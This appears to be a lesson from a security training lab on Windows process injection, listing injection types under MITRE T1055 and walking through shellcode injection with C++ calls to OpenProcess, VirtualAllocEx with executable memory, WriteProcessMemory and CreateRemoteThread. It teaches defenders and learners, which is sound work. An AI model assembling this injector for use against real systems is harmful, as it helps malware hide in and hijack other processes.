# Abusing Processes

Applications running on your operating system can contain one or more processes. Processes maintain and represent a program that’s being executed. 

Processes have several sub-components and directly interact with memory or virtual memory, making them a perfect candidate to target. The table below describes each critical component of processes and their purpose:

| Process Component            | Purpose                                                                 |
|------------------------------|-------------------------------------------------------------------------|
| **Private Virtual Address Space** | Virtual memory addresses the process is allocated.                     |
| **Executable Program**       | Defines code and data stored in the virtual address space.              |
| **Open Handles**             | Defines handles to system resources accessible to the process.          |
| **Security Context**         | The access token defines the user, security groups, privileges, and other security information. |
| **Process ID**               | Unique numerical identifier of the process.                             |
| **Threads**                  | Section of a process scheduled for execution.                          |

For more information about processes, check out the **Windows Internals** room.

---

## Process Injection Overview

Process injection is commonly used as an overarching term to describe injecting malicious code into a process through legitimate functionality or components. Below are four common types of process injection:

| Injection Type               | Function                                                                 |
|------------------------------|-------------------------------------------------------------------------|
| **Process Hollowing**        | Inject code into a suspended and “hollowed” target process.             |
| **Thread Execution Hijacking** | Inject code into a suspended target thread.                            |
| **Dynamic-link Library Injection** | Inject a DLL into process memory.                                   |
| **Portable Executable Injection** | Self-inject a PE image pointing to a malicious function into a target process. |

There are many other forms of process injection outlined by **MITRE T1055**.

---

## Shellcode Injection

At its most basic level, process injection takes the form of **shellcode injection**. Shellcode injection can be broken down into four steps:

1. Open a target process with all access rights.
2. Allocate target process memory for the shellcode.
3. Write shellcode to allocated memory in the target process.
4. Execute the shellcode using a remote thread.

### Step-by-Step Breakdown

#### Step 1: Open the Target Process
Use the `OpenProcess` function to open the target process supplied via the command-line:

```cpp
processHandle = OpenProcess(
    PROCESS_ALL_ACCESS, // Defines access rights
    FALSE, // Target handle will not be inherited
    DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```

#### Step 2: Allocate Memory
Allocate memory to the byte size of the shellcode using `VirtualAllocEx`:

```cpp
remoteBuffer = VirtualAllocEx(
    processHandle, // Opened target process
    NULL, 
    sizeof shellcode, // Region size of memory allocation
    (MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
    PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the committed pages
);
```

#### Step 3: Write Shellcode
Write the shellcode to the allocated memory region using `WriteProcessMemory`:

```cpp
WriteProcessMemory(
    processHandle, // Opened target process
    remoteBuffer, // Allocated memory region
    shellcode, // Data to write
    sizeof shellcode, // Byte size of data
    NULL
);
```

#### Step 4: Execute Shellcode
Execute the shellcode residing in memory using `CreateRemoteThread`:

```cpp
remoteThread = CreateRemoteThread(
    processHandle, // Opened target process
    NULL, 
    0, // Default size of the stack
    (LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
    NULL, 
    0, // Ran immediately after creation
    NULL
);
```

---

## Summary

We can compile these steps together to create a basic process injector. Use the provided C++ injector to experiment with process injection.

Shellcode injection is the most basic form of process injection. In the next task, we will explore how to modify and adapt these steps for **process hollowing**.